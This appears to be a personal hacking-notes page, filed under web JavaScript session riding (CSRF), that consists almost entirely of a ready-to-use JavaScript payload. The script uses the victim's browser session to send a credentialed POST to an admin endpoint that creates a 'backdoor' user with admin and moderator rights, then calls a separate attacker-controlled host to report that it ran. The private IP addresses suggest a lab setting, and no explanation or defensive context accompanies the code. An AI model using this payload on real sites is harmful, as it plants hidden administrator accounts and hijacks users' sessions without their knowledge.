---
{"dg-publish":true,"permalink":"/1-hack-like-a-script-kiddie/web/javascript/session-riding-csrf/javascript-payload-session-riding-csrf/","noteIcon":"","created":"2025-04-15T14:11:19.606-04:00"}
---

















```javascript
data = 'name=backdoor&email=pwnd@answers.local&isAdmin=True&isMod=True';
const stime = Date.now();
fetch('http://192.168.121.251/admin/users/create', {
            method: 'POST',    
            credentials:'include',
            headers: {'Content-Type':'application/x-www-form-urlencoded'},
            body: data
}).then((response) => response.text()).then((start) => {
            const etime = Date.now();
            fetch('http://192.168.118.7:9090/?start=' + stime + '&stop=' + etime);
             });
```